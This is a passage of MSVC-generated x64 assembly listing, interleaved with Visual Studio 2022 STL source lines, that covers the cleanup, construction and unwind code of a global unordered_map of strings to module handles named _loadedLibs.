; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	and	rdx, -8

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN24@Tidy

; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r8, QWORD PTR [rcx-8]
	add	rdx, 39					; 00000027H

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rcx, r8

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	lea	rax, QWORD PTR [rcx-8]
	cmp	rax, 31
	ja	SHORT $LN21@Tidy

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rcx, r8
$LN24@Tidy:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 312  :             _Mypair._Myval2._Myfirst = nullptr;

	xor	eax, eax
	mov	QWORD PTR [rbx], rax

; 313  :             _Mypair._Myval2._Mylast  = nullptr;

	mov	QWORD PTR [rbx+8], rax

; 314  :             _Mypair._Myval2._Myend   = nullptr;

	mov	QWORD PTR [rbx+16], rax
$LN2@Tidy:

; 316  :     }

	add	rsp, 32					; 00000020H
	pop	rbx
	ret	0
$LN21@Tidy:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN31@Tidy:
?_Tidy@?$_Hash_vec@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEAAXXZ ENDP ; std::_Hash_vec<std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > > >::_Tidy
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\unordered_map
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
;	COMDAT ??0?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEAA@AEBV?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@1@AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@1@@Z
_TEXT	SEGMENT
this$dead$ = 48
_Parg$ = 56
_Al$dead$ = 64
this$ = 64
??0?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEAA@AEBV?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@1@AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@1@@Z PROC ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >, COMDAT

; 373  :         : _Traitsobj(_Parg), _List(_Al), _Vec(_Al), _Mask(_Min_buckets - 1), _Maxidx(_Min_buckets) {

$LN67:
	mov	QWORD PTR [rsp+24], r8
	push	rdi
	sub	rsp, 32					; 00000020H
	lea	rdi, OFFSET FLAT:?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A
	mov	QWORD PTR this$[rsp], rdi
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\unordered_map

; 49   :     explicit _Umap_traits(const _Tr& _Traits) noexcept(is_nothrow_copy_constructible_v<_Tr>) : _Tr(_Traits) {}

	mov	eax, DWORD PTR [rdx]
	mov	DWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A, eax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list

; 353  :     _List_val() noexcept : _Myhead(), _Mysize(0) {} // initialize data

	mov	QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+8, 0
	mov	QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+16, 0

; 1838 :         auto _Newhead = _Al.allocate(1);

	mov	ecx, 56					; 00000038H
	call	??2@YAPEAX_K@Z				; operator new

; 1839 :         _Construct_in_place(_Newhead->_Next, _Newhead);

	mov	QWORD PTR [rax], rax

; 1840 :         _Construct_in_place(_Newhead->_Prev, _Newhead);

	mov	QWORD PTR [rax+8], rax

; 1841 :         _Mypair._Myval2._Myhead = _Newhead;

	mov	QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+8, rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 400  :     _CONSTEXPR20 _Vector_val() noexcept : _Myfirst(), _Mylast(), _Myend() {}

	mov	QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+24, 0
	xorps	xmm0, xmm0
	movdqa	XMMWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+32, xmm0
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 373  :         : _Traitsobj(_Parg), _List(_Al), _Vec(_Al), _Mask(_Min_buckets - 1), _Maxidx(_Min_buckets) {

	mov	QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+48, 7
	mov	QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+56, 8

; 374  :         // construct empty hash table
; 375  :         _Max_bucket_size() = _Bucket_size;

	mov	DWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A, 1065353216 ; 3f800000H

; 376  :         _Vec._Assign_grow(_Min_buckets * 2, _List._Unchecked_end());

	mov	r8, rax
	mov	edx, 16
	lea	rcx, OFFSET FLAT:?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+24
	call	?_Assign_grow@?$_Hash_vec@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEAAX_KV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@@Z ; std::_Hash_vec<std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > > >::_Assign_grow
	npad	1

; 377  : #ifdef _ENABLE_STL_INTERNAL_CHECK
; 378  :         _Stl_internal_check_container_invariants();
; 379  : #endif // _ENABLE_STL_INTERNAL_CHECK
; 380  :     }

	mov	rax, rdi
	add	rsp, 32					; 00000020H
	pop	rdi
	ret	0
??0?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEAA@AEBV?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@1@AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@1@@Z ENDP ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
this$dead$ = 48
_Parg$ = 56
_Al$dead$ = 64
this$ = 64
?dtor$0@?0???0?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEAA@AEBV?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@1@AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@1@@Z@4HA PROC ; `std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >'::`1'::dtor$0
	mov	rcx, QWORD PTR this$[rdx]
	add	rcx, 8
	jmp	??1?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA@XZ ; std::list<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::~list<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >
?dtor$0@?0???0?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEAA@AEBV?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@1@AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@1@@Z@4HA ENDP ; `std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
this$dead$ = 48
_Parg$ = 56
_Al$dead$ = 64
this$ = 64
?dtor$1@?0???0?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEAA@AEBV?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@1@AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@1@@Z@4HA PROC ; `std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >'::`1'::dtor$1
	mov	rcx, QWORD PTR this$[rdx]
	add	rcx, 24
	jmp	??1?$_Hash_vec@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEAA@XZ ; std::_Hash_vec<std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > > >::~_Hash_vec<std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > > >
?dtor$1@?0???0?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEAA@AEBV?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@1@AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@1@@Z@4HA ENDP ; `std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >'::`1'::dtor$1
text$x	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
;	COMDAT ?_Tidy@?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@AEAAXXZ
_TEXT	SEGMENT
this$ = 48
?_Tidy@?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@AEAAXXZ PROC ; std::list<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::_Tidy, COMDAT

; 1499 :     void _Tidy() noexcept {

$LN51:
	push	rbx
	sub	rsp, 32					; 00000020H

; 1500 :         auto& _Al      = _Getal();
; 1501 :         auto& _My_data = _Mypair._Myval2;
; 1502 :         _My_data._Orphan_all();
; 1503 :         _Node::_Free_non_head(_Al, _My_data._Myhead);

	mov	rdx, QWORD PTR [rcx]
	mov	rbx, rcx
